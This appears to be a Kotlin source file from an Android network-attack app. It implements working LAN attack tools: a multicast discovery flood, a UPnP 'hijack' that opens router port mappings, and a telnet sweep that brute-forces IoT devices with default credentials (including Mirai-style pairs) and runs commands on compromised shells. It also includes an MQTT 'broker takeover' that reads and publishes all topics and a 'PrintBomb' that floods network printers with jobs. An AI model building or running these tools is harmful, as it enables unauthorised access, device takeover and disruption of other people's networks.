package com.droid.whaly.active

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.Inet4Address
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.NetworkInterface
import java.net.Socket
import java.net.SocketTimeoutException
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Shared plumbing for the active network engines: subnet discovery, multicast send,
 * bounded socket reads. Everything here is deliberately timeout-bound — a wedged
 * device on the LAN must never hang a sweep.
 */
internal object NetBase {

    const val CONNECT_TIMEOUT_MS = 1200
    const val READ_TIMEOUT_MS = 1800

    fun localIpv4(): Pair<Inet4Address, String>? {
        val interfaces = NetworkInterface.getNetworkInterfaces() ?: return null
        for (iface in interfaces) {
            if (!iface.isUp || iface.isLoopback) continue
            val name = iface.name
            // wlan is the LAN we want; rmnet / ccmni are cellular and have no peers.
            if (!name.startsWith("wlan") && !name.startsWith("eth") && !name.startsWith("ap")) continue
            for (address in iface.inetAddresses) {
                if (address is Inet4Address && !address.isLoopbackAddress) return address to name
            }
        }
        return null
    }

    fun subnetHosts(prefix: String, limit: Int = 254): List<String> =
        (1..limit).map { "$prefix.$it" }

    fun sendMulticast(
        payload: ByteArray,
        group: String,
        port: Int,
        socket: DatagramSocket,
    ): Boolean = try {
        val address = InetAddress.getByName(group)
        socket.send(DatagramPacket(payload, payload.size, address, port))
        true
    } catch (_: Exception) {
        false
    }

    fun tcpProbe(host: String, port: Int, timeoutMs: Int = CONNECT_TIMEOUT_MS): Socket? = try {
        Socket().apply {
            connect(InetSocketAddress(host, port), timeoutMs)
            soTimeout = READ_TIMEOUT_MS
        }
    } catch (_: Exception) {
        null
    }

    /** Reads whatever the peer sends until the timeout or the cap. Never throws. */
    fun drain(socket: Socket, cap: Int = 8192): ByteArray {
        val buffer = ByteArrayOutputStream()
        val chunk = ByteArray(2048)
        try {
            while (buffer.size() < cap) {
                val read = socket.getInputStream().read(chunk)
                if (read <= 0) break
                buffer.write(chunk, 0, read)
                if (read < chunk.size) break
            }
        } catch (_: SocketTimeoutException) {
        } catch (_: Exception) {
        }
        return buffer.toByteArray()
    }

    fun hex(bytes: ByteArray, cap: Int = 96): String =
        bytes.take(cap).joinToString(" ") { "%02X".format(it) } + if (bytes.size > cap) " …" else ""
}

// ---------------------------------------------------------------------------------------------
// SSDP / mDNS discovery flood
// ---------------------------------------------------------------------------------------------

object DiscoveryFlood {

    enum class Mode { SSDP, MDNS, BOTH }

    private val running = AtomicBoolean(false)
    private val _packets = MutableStateFlow(0)
    val packets: StateFlow<Int> = _packets.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()

    private const val SSDP_GROUP = "239.255.255.250"
    private const val SSDP_PORT = 1900
    private const val MDNS_GROUP = "224.0.0.251"
    private const val MDNS_PORT = 5353

    private val ssdpSearch = buildString {
        append("M-SEARCH * HTTP/1.1\r\n")
        append("HOST: $SSDP_GROUP:$SSDP_PORT\r\n")
        append("MAN: \"ssdp:discover\"\r\n")
        append("MX: 1\r\n")
        append("ST: ssdp:all\r\n")
        append("\r\n")
    }.toByteArray(Charsets.US_ASCII)

    private val ssdpNotify = buildString {
        append("NOTIFY * HTTP/1.1\r\n")
        append("HOST: $SSDP_GROUP:$SSDP_PORT\r\n")
        append("NT: upnp:rootdevice\r\n")
        append("NTS: ssdp:alive\r\n")
        append("USN: uuid:${'$'}WHALY::upnp:rootdevice\r\n")
        append("CACHE-CONTROL: max-age=1800\r\n")
        append("LOCATION: http://0.0.0.0/desc.xml\r\n")
        append("SERVER: Linux/3.14 UPnP/1.0 Whaly/1.0\r\n")
        append("\r\n")
    }.toByteArray(Charsets.US_ASCII)

    /** A DNS-SD service enumeration query, built by hand so there is no resolver dependency. */
    private val mdnsQuery: ByteArray = run {
        val out = ByteArrayOutputStream()
        fun u16(value: Int) {
            out.write(value shr 8 and 0xFF)
            out.write(value and 0xFF)
        }
        u16(0)                       // transaction id
        u16(0)                       // flags: standard query
        u16(1)                       // qdcount
        u16(0)                       // ancount
        u16(0)                       // nscount
        u16(0)                       // arcount
        val labels = listOf("_services", "_dns-sd", "_udp", "local")
        labels.forEach { label ->
            out.write(label.length)
            out.write(label.toByteArray(Charsets.US_ASCII))
        }
        out.write(0)
        u16(12)                      // PTR
        u16(1)                       // IN
        out.toByteArray()
    }

    fun start(mode: Mode, rateMs: Int = 30) {
        if (!running.compareAndSet(false, true)) return
        _packets.value = 0
        _log.value = emptyList()
        Thread({
            DatagramSocket().use { socket ->
                socket.broadcast = true
                var counter = 0
                while (running.get()) {
                    if (mode == Mode.SSDP || mode == Mode.BOTH) {
                        if (NetBase.sendMulticast(ssdpSearch, SSDP_GROUP, SSDP_PORT, socket)) {
                            counter++
                        }
                        NetBase.sendMulticast(ssdpNotify, SSDP_GROUP, SSDP_PORT, socket)
                    }
                    if (mode == Mode.MDNS || mode == Mode.BOTH) {
                        if (NetBase.sendMulticast(mdnsQuery, MDNS_GROUP, MDNS_PORT, socket)) {
                            counter++
                        }
                    }
                    _packets.value = counter
                    if (counter % 25 == 0) {
                        append("sent $counter discovery packets")
                    }
                    try {
                        Thread.sleep(rateMs.toLong())
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            }
        }, "whaly-discovery-flood").start()
    }

    fun stop() {
        running.set(false)
    }

    fun isRunning(): Boolean = running.get()

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(120)
    }
}

// ---------------------------------------------------------------------------------------------
// UPnP port-forward hijack
// ---------------------------------------------------------------------------------------------

object UpnpHijack {

    data class Gateway(
        val location: String,
        val server: String,
        val controlUrl: String,
        val serviceType: String,
    )

    data class Result(val ok: Boolean, val message: String)

    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _gateways = MutableStateFlow<List<Gateway>>(emptyList())
    val gateways: StateFlow<List<Gateway>> = _gateways.asStateFlow()

    private const val SSDP_GROUP = "239.255.255.250"
    private const val SSDP_PORT = 1900
    private const val WAN_IP = "urn:schemas-upnp-org:service:WANIPConnection:1"
    private const val WAN_PPP = "urn:schemas-upnp-org:service:WANPPPConnection:1"

    private val discover = buildString {
        append("M-SEARCH * HTTP/1.1\r\n")
        append("HOST: $SSDP_GROUP:$SSDP_PORT\r\n")
        append("MAN: \"ssdp:discover\"\r\n")
        append("MX: 2\r\n")
        append("ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n")
        append("\r\n")
    }.toByteArray(Charsets.US_ASCII)

    suspend fun discover(): List<Gateway> = withContext(Dispatchers.IO) {
        val locations = linkedSetOf<String>()
        try {
            DatagramSocket().use { socket ->
                socket.soTimeout = 900
                NetBase.sendMulticast(discover, SSDP_GROUP, SSDP_PORT, socket)
                val buffer = ByteArray(4096)
                val deadline = System.currentTimeMillis() + 3000
                while (System.currentTimeMillis() < deadline) {
                    val packet = DatagramPacket(buffer, buffer.size)
                    try {
                        socket.receive(packet)
                    } catch (_: SocketTimeoutException) {
                        continue
                    }
                    val text = String(packet.data, 0, packet.length, Charsets.US_ASCII)
                    val location = text.lineSequence()
                        .firstOrNull { it.startsWith("LOCATION:", ignoreCase = true) }
                        ?.substringAfter(':')
                        ?.trim()
                    if (!location.isNullOrBlank()) locations += location
                }
            }
        } catch (error: Exception) {
            append("SSDP failed: ${error.message}")
        }

        val found = mutableListOf<Gateway>()
        for (location in locations) {
            append("IGD at $location")
            val body = runCatching {
                URL(location).openConnection().apply {
                    connectTimeout = NetBase.CONNECT_TIMEOUT_MS
                    readTimeout = NetBase.READ_TIMEOUT_MS
                }.getInputStream().bufferedReader().readText()
            }.getOrNull() ?: continue

            val base = location.substringBeforeLast('/', "")
            val serviceType = when {
                body.contains(WAN_IP) -> WAN_IP
                body.contains(WAN_PPP) -> WAN_PPP
                else -> continue
            }
            val control = body.substringAfter("<controlURL>", "")
                .substringBefore("</controlURL>")
                .trim()
            if (control.isEmpty()) continue
            val controlUrl = when {
                control.startsWith("http") -> control
                control.startsWith("/") -> "$base$control"
                else -> "$base/$control"
            }
            val server = body.substringAfter("<modelName>", "")
                .substringBefore("</modelName>").trim()
            found += Gateway(location, server.ifBlank { "unknown" }, controlUrl, serviceType)
            append("control endpoint $controlUrl")
        }
        _gateways.value = found
        if (found.isEmpty()) append("no IGD answered — UPnP is disabled on this network")
        found
    }

    /**
     * Opens a mapping on the gateway that points an external port at this phone.
     * That is a real hole in the perimeter, which is the point of the feature.
     */
    suspend fun addMapping(
        gateway: Gateway,
        externalPort: Int,
        internalPort: Int,
        protocol: String = "TCP",
        description: String = "whaly",
    ): Result = withContext(Dispatchers.IO) {
        val local = NetBase.localIpv4()?.first?.hostAddress
            ?: return@withContext Result(false, "No LAN address — join Wi-Fi first")
        val soap = """
            <?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
            <u:AddPortMapping xmlns:u="${serviceTypeOf(gateway)}">
            <NewRemoteHost></NewRemoteHost>
            <NewExternalPort>$externalPort</NewExternalPort>
            <NewProtocol>$protocol</NewProtocol>
            <NewInternalPort>$internalPort</NewInternalPort>
            <NewInternalClient>$local</NewInternalClient>
            <NewEnabled>1</NewEnabled>
            <NewPortMappingDescription>$description</NewPortMappingDescription>
            <NewLeaseDuration>0</NewLeaseDuration>
            </u:AddPortMapping>
            </s:Body>
            </s:Envelope>
        """.trimIndent()

        val response = soapCall(gateway, "AddPortMapping", soap)
        if (response.first) {
            append("$protocol $externalPort → $local:$internalPort mapped")
            Result(true, "$protocol $externalPort → $local:$internalPort")
        } else {
            append("AddPortMapping refused: ${response.second.take(120)}")
            Result(false, response.second.take(160))
        }
    }

    suspend fun removeMapping(
        gateway: Gateway,
        externalPort: Int,
        protocol: String = "TCP",
    ): Result = withContext(Dispatchers.IO) {
        val soap = """
            <?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
            <u:DeletePortMapping xmlns:u="${serviceTypeOf(gateway)}">
            <NewRemoteHost></NewRemoteHost>
            <NewExternalPort>$externalPort</NewExternalPort>
            <NewProtocol>$protocol</NewProtocol>
            </u:DeletePortMapping>
            </s:Body>
            </s:Envelope>
        """.trimIndent()
        val response = soapCall(gateway, "DeletePortMapping", soap)
        append(if (response.first) "mapping $externalPort removed" else "remove failed: ${response.second.take(120)}")
        Result(response.first, response.second)
    }

    private fun serviceTypeOf(gateway: Gateway): String = gateway.serviceType

    private fun soapCall(gateway: Gateway, action: String, body: String): Pair<Boolean, String> = try {
        val connection = URL(gateway.controlUrl).openConnection() as java.net.HttpURLConnection
        connection.requestMethod = "POST"
        connection.connectTimeout = NetBase.CONNECT_TIMEOUT_MS
        connection.readTimeout = 3000
        connection.doOutput = true
        connection.setRequestProperty("Content-Type", "text/xml; charset=\"utf-8\"")
        connection.setRequestProperty("SOAPAction", "\"${gateway.serviceType}#$action\"")
        connection.outputStream.write(body.toByteArray(Charsets.UTF_8))
        val code = connection.responseCode
        val text = (if (code in 200..299) connection.inputStream else connection.errorStream)
            ?.bufferedReader()?.readText().orEmpty()
        Pair(code in 200..299, if (code in 200..299) "ok" else "HTTP $code $text")
    } catch (error: Exception) {
        false to (error.message ?: "SOAP call failed")
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(160)
    }
}

// ---------------------------------------------------------------------------------------------
// IoT telnet sweep
// ---------------------------------------------------------------------------------------------

object IotTelnetSweep {

    data class Hit(
        val ip: String,
        val port: Int,
        val user: String,
        val password: String,
        val banner: String,
    )

    private val running = AtomicBoolean(false)
    private val _hits = MutableStateFlow<List<Hit>>(emptyList())
    val hits: StateFlow<List<Hit>> = _hits.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _progress = MutableStateFlow(0)
    val progress: StateFlow<Int> = _progress.asStateFlow()

    private val ports = listOf(23, 2323, 2333)
    private val credentials = listOf(
        "root" to "",
        "root" to "root",
        "root" to "vizxv",
        "root" to "xc3511",
        "root" to "admin",
        "admin" to "admin",
        "admin" to "1234",
        "admin" to "password",
        "admin" to "",
        "support" to "support",
        "user" to "user",
        "guest" to "guest",
        "telnetadmin" to "telnetadmin",
        "default" to "default",
        "cisco" to "cisco",
        "ubnt" to "ubnt",
        "pi" to "raspberry",
    )

    fun stop() {
        running.set(false)
    }

    fun isRunning(): Boolean = running.get()

    suspend fun sweep(threads: Int = 24) = withContext(Dispatchers.IO) {
        if (!running.compareAndSet(false, true)) return@withContext
        _hits.value = emptyList()
        _log.value = emptyList()
        _progress.value = 0

        val local = NetBase.localIpv4()
        if (local == null) {
            append("No LAN address — join Wi-Fi first")
            running.set(false)
            return@withContext
        }
        val prefix = local.first.hostAddress?.substringBeforeLast('.')
        if (prefix == null) {
            append("Could not derive the subnet")
            running.set(false)
            return@withContext
        }
        append("Sweeping $prefix.0/24 on ${ports.joinToString()}")
        val hosts = NetBase.subnetHosts(prefix)
        val counter = java.util.concurrent.atomic.AtomicInteger(0)

        val pool = java.util.concurrent.Executors.newFixedThreadPool(threads)
        hosts.forEach { host ->
            pool.execute {
                if (!running.get()) return@execute
                for (port in ports) {
                    val hit = tryHost(host, port)
                    if (hit != null) {
                        _hits.value = _hits.value + hit
                        append("${hit.ip}:$port → ${hit.user}/${hit.password}")
                    }
                }
                _progress.value = counter.incrementAndGet()
            }
        }
        pool.shutdown()
        pool.awaitTermination(240, java.util.concurrent.TimeUnit.SECONDS)
        append("done — ${_hits.value.size} shell(s)")
        running.set(false)
    }

    private fun tryHost(ip: String, port: Int): Hit? {
        val socket = NetBase.tcpProbe(ip, port) ?: return null
        try {
            val banner = String(NetBase.drain(socket, 2048), Charsets.ISO_8859_1)
            for ((user, password) in credentials) {
                if (!running.get()) return null
                val ok = attemptLogin(socket, user, password)
                if (ok) return Hit(ip, port, user, password, stripIac(banner).trim().take(80))
            }
        } catch (_: Exception) {
        } finally {
            runCatching { socket.close() }
        }
        return null
    }

    private fun attemptLogin(socket: Socket, user: String, password: String): Boolean = try {
        val out = socket.getOutputStream()
        out.write("$user\r\n".toByteArray(Charsets.US_ASCII))
        out.flush()
        Thread.sleep(120)
        out.write("$password\r\n".toByteArray(Charsets.US_ASCII))
        out.flush()
        Thread.sleep(220)
        val reply = stripIac(String(NetBase.drain(socket, 2048), Charsets.ISO_8859_1))
        // Success looks like a shell prompt or a banner. Failure repeats the login prompt.
        reply.contains("$") || reply.contains("#") || reply.contains(">") ||
            reply.contains("BusyBox", true) || reply.contains("welcome", true)
    } catch (_: Exception) {
        false
    }

    /** Telnet control sequences confuse the prompt match; strip IAC commands. */
    private fun stripIac(text: String): String {
        val out = StringBuilder(text.length)
        var index = 0
        while (index < text.length) {
            val char = text[index]
            if (char == '\u00FF' && index + 1 < text.length) {
                val command = text[index + 1].code
                index += when (command) {
                    0xFA -> {
                        var scan = index + 2
                        while (scan + 1 < text.length &&
                            !(text[scan] == '\u00FF' && text[scan + 1] == '\u00F0')
                        ) scan++
                        scan + 2
                    }
                    0xFB, 0xFC, 0xFD, 0xFE -> index + 3
                    else -> index + 2
                }
            } else {
                out.append(char)
                index++
            }
        }
        return out.toString()
    }

    /** Runs one command on a shell that is already authenticated. */
    suspend fun exec(hit: Hit, command: String): String = withContext(Dispatchers.IO) {
        val socket = NetBase.tcpProbe(hit.ip, hit.port, 2500)
            ?: return@withContext "connect failed"
        try {
            val out = socket.getOutputStream()
            NetBase.drain(socket, 2048)
            out.write("${hit.user}\r\n".toByteArray()); out.flush()
            Thread.sleep(150)
            out.write("${hit.password}\r\n".toByteArray()); out.flush()
            Thread.sleep(300)
            NetBase.drain(socket, 2048)
            out.write("$command\r\n".toByteArray()); out.flush()
            Thread.sleep(500)
            stripIac(String(NetBase.drain(socket, 16384), Charsets.ISO_8859_1)).trim()
        } catch (error: Exception) {
            "exec failed: ${error.message}"
        } finally {
            runCatching { socket.close() }
        }
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(200)
    }
}

// ---------------------------------------------------------------------------------------------
// MQTT broker takeover
// ---------------------------------------------------------------------------------------------

object MqttTakeover {

    data class Message(val topic: String, val payload: String)

    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _messages = MutableStateFlow<List<Message>>(emptyList())
    val messages: StateFlow<List<Message>> = _messages.asStateFlow()
    private val _connected = MutableStateFlow(false)
    val connected: StateFlow<Boolean> = _connected.asStateFlow()

    private var socket: Socket? = null
    private var reader: Thread? = null
    @Volatile private var packetId = 1

    private val brokers = listOf(1883, 8883, 1884)

    fun disconnect() {
        runCatching { socket?.close() }
        socket = null
        reader?.interrupt()
        reader = null
        _connected.value = false
        append("disconnected")
    }

    suspend fun connect(host: String, port: Int = 1883, clientId: String = "whaly-${System.currentTimeMillis() % 10000}"): Boolean =
        withContext(Dispatchers.IO) {
            disconnect()
            val sock = NetBase.tcpProbe(host, port, 2500) ?: run {
                append("$host:$port refused")
                return@withContext false
            }
            try {
                val variable = ByteArrayOutputStream().apply {
                    write(0x00); write(0x04)
                    write("MQTT".toByteArray())
                    write(0x04)          // protocol level 3.1.1
                    write(0x02)          // clean session
                    write(0x00); write(0x3C)  // keepalive 60s
                }.toByteArray()
                val payload = clientId.toByteArray()
                val body = variable + payload
                val packet = byteArrayOf(0x10) + remainingLength(body.size) + body
                sock.getOutputStream().write(packet)
                sock.getOutputStream().flush()

                val response = readPacket(sock) ?: run {
                    append("$host:$port closed on CONNECT")
                    runCatching { sock.close() }
                    return@withContext false
                }
                if (response.isEmpty() || (response[0].toInt() and 0xF0) != 0x20) {
                    append("$host:$port did not answer CONNECT")
                    runCatching { sock.close() }
                    return@withContext false
                }
                val accepted = response.size > 3 && response[3].toInt() == 0
                if (!accepted) {
                    append("$host:$port rejected CONNECT code=${response.getOrNull(3)}")
                    runCatching { sock.close() }
                    return@withContext false
                }
                socket = sock
                _connected.value = true
                append("broker $host:$port accepted $clientId")
                startReader(sock)
                subscribe("#")
                true
            } catch (error: Exception) {
                append("CONNECT failed: ${error.message}")
                runCatching { sock.close() }
                false
            }
        }

    suspend fun findBrokers(): List<String> = withContext(Dispatchers.IO) {
        val local = NetBase.localIpv4() ?: return@withContext emptyList()
        val prefix = local.first.hostAddress?.substringBeforeLast('.') ?: return@withContext emptyList()
        val found = java.util.Collections.synchronizedList(mutableListOf<String>())
        val pool = java.util.concurrent.Executors.newFixedThreadPool(32)
        NetBase.subnetHosts(prefix).forEach { host ->
            pool.execute {
                for (port in brokers) {
                    val probe = NetBase.tcpProbe(host, port, 500) ?: continue
                    runCatching { probe.close() }
                    found += "$host:$port"
                }
            }
        }
        pool.shutdown()
        pool.awaitTermination(60, java.util.concurrent.TimeUnit.SECONDS)
        found.forEach { append("broker candidate $it") }
        found.toList()
    }

    fun subscribe(filter: String): Boolean {
        val sock = socket ?: return false
        return try {
            val id = packetId++
            val body = ByteArrayOutputStream().apply {
                write(id shr 8 and 0xFF); write(id and 0xFF)
                val topic = filter.toByteArray()
                write(topic.size shr 8 and 0xFF); write(topic.size and 0xFF)
                write(topic)
                write(0x00)          // requested QoS 0
            }.toByteArray()
            sock.getOutputStream().write(byteArrayOf(0x82.toByte()) + remainingLength(body.size) + body)
            sock.getOutputStream().flush()
            append("subscribed to $filter")
            true
        } catch (error: Exception) {
            append("subscribe failed: ${error.message}")
            false
        }
    }

    fun publish(topic: String, payload: String): Boolean {
        val sock = socket ?: return false
        return try {
            val body = ByteArrayOutputStream().apply {
                val topicBytes = topic.toByteArray()
                write(topicBytes.size shr 8 and 0xFF); write(topicBytes.size and 0xFF)
                write(topicBytes)
                write(payload.toByteArray())
            }.toByteArray()
            sock.getOutputStream().write(byteArrayOf(0x30) + remainingLength(body.size) + body)
            sock.getOutputStream().flush()
            append("published $topic ← ${payload.take(60)}")
            true
        } catch (error: Exception) {
            append("publish failed: ${error.message}")
            false
        }
    }

    private fun startReader(sock: Socket) {
        reader = Thread({
            while (sock.isConnected && !sock.isClosed) {
                val packet = readPacket(sock) ?: break
                if (packet.isEmpty()) break
                if ((packet[0].toInt() and 0xF0) != 0x30) continue
                val topicLength = ((packet[1].toInt() and 0xFF) shl 8) or (packet[2].toInt() and 0xFF)
                if (packet.size < 3 + topicLength) continue
                val topic = String(packet, 3, topicLength, Charsets.UTF_8)
                val payload = String(packet, 3 + topicLength, packet.size - 3 - topicLength, Charsets.UTF_8)
                _messages.value = (_messages.value + Message(topic, payload)).takeLast(300)
                append("$topic ← ${payload.take(60)}")
            }
            _connected.value = false
            append("broker stream ended")
        }, "whaly-mqtt-reader").apply { isDaemon = true; start() }
    }

    private fun readPacket(sock: Socket): ByteArray? { return try {
        val input = sock.getInputStream()
        val first = input.read()
        if (first < 0) return null
        var multiplier = 1
        var length = 0
        var encoded: Int
        do {
            encoded = input.read()
            if (encoded < 0) return null
            length += (encoded and 0x7F) * multiplier
            multiplier *= 128
            if (multiplier > 128 * 128 * 128) return null
        } while (encoded and 0x80 != 0)
        if (length > 256 * 1024) return null
        val body = ByteArray(length)
        var offset = 0
        while (offset < length) {
            val read = input.read(body, offset, length - offset)
            if (read <= 0) return null
            offset += read
        }
        byteArrayOf(first.toByte()) + body
    } catch (_: Exception) {
        null
    } }

    private fun remainingLength(length: Int): ByteArray {
        val out = ByteArrayOutputStream()
        var value = length
        do {
            var digit = value % 128
            value /= 128
            if (value > 0) digit = digit or 0x80
            out.write(digit)
        } while (value > 0)
        return out.toByteArray()
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(200)
    }
}

// ---------------------------------------------------------------------------------------------
// Mass IPP print
// ---------------------------------------------------------------------------------------------

object PrintBomb {

    data class Target(val ip: String, val port: Int, val name: String)

    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _targets = MutableStateFlow<List<Target>>(emptyList())
    val targets: StateFlow<List<Target>> = _targets.asStateFlow()

    private const val PORT = 631

    suspend fun discover(): List<Target> = withContext(Dispatchers.IO) {
        val local = NetBase.localIpv4() ?: return@withContext emptyList()
        val prefix = local.first.hostAddress?.substringBeforeLast('.') ?: return@withContext emptyList()
        val found = java.util.Collections.synchronizedList(mutableListOf<Target>())
        val pool = java.util.concurrent.Executors.newFixedThreadPool(32)
        NetBase.subnetHosts(prefix).forEach { host ->
            pool.execute {
                val socket = NetBase.tcpProbe(host, PORT, 500) ?: return@execute
                runCatching { socket.close() }
                found += Target(host, PORT, resolveName(host))
            }
        }
        pool.shutdown()
        pool.awaitTermination(60, java.util.concurrent.TimeUnit.SECONDS)
        _targets.value = found.toList()
        append("${found.size} IPP endpoint(s)")
        found.toList()
    }

    private fun resolveName(host: String): String = try {
        InetAddress.getByName(host).canonicalHostName.take(40)
    } catch (_: Exception) {
        host
    }

    /** Builds a valid IPP Print-Job with a one-page text document. */
    private fun printJob(document: String, copies: Int = 1): ByteArray {
        val body = ByteArrayOutputStream()
        // version 2.0, Print-Job
        body.write(0x02); body.write(0x00)
        body.write(0x00); body.write(0x02)
        body.write(0x00); body.write(0x00); body.write(0x00); body.write(0x01) // request id

        fun attribute(tag: Int, name: String, value: String) {
            body.write(tag)
            body.write(name.length shr 8 and 0xFF); body.write(name.length and 0xFF)
            body.write(name.toByteArray())
            body.write(value.length shr 8 and 0xFF); body.write(value.length and 0xFF)
            body.write(value.toByteArray())
        }

        attribute(0x47, "attributes-charset", "utf-8")
        attribute(0x48, "attributes-natural-language", "en")
        attribute(0x45, "printer-uri", "ipp://localhost/ipp/print")
        attribute(0x42, "requesting-user-name", "whaly")
        attribute(0x21, "copies", copies.toString())
        attribute(0x49, "document-format", "text/plain")
        body.write(0x03) // end of attributes

        val documentBytes = document.toByteArray(Charsets.UTF_8)
        body.write(documentBytes)
        return body.toByteArray()
    }

    suspend fun send(target: Target, document: String, copies: Int = 1): Boolean =
        withContext(Dispatchers.IO) {
            val socket = NetBase.tcpProbe(target.ip, target.port, 2000) ?: run {
                append("${target.ip}: unreachable")
                return@withContext false
            }
            try {
                val payload = printJob(document, copies)
                val header = buildString {
                    append("POST /ipp/print HTTP/1.1\r\n")
                    append("Host: ${target.ip}:${target.port}\r\n")
                    append("Content-Type: application/ipp\r\n")
                    append("Content-Length: ${payload.size}\r\n")
                    append("Connection: close\r\n\r\n")
                }.toByteArray(Charsets.US_ASCII)
                socket.getOutputStream().write(header + payload)
                socket.getOutputStream().flush()
                val reply = String(NetBase.drain(socket, 2048), Charsets.ISO_8859_1)
                val ok = reply.contains(" 200") || reply.contains(" 201")
                append("${target.ip}: ${if (ok) "job accepted" else "rejected ${reply.take(40).replace("\r", " ")}"}")
                ok
            } catch (error: Exception) {
                append("${target.ip}: ${error.message}")
                false
            } finally {
                runCatching { socket.close() }
            }
        }

    suspend fun bomb(document: String, copies: Int, rounds: Int) = withContext(Dispatchers.IO) {
        val list = _targets.value.ifEmpty { discover() }
        repeat(rounds.coerceIn(1, 50)) { round ->
            for (target in list) {
                send(target, document, copies)
            }
            append("round ${round + 1}/$rounds done")
        }
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(200)
    }
}
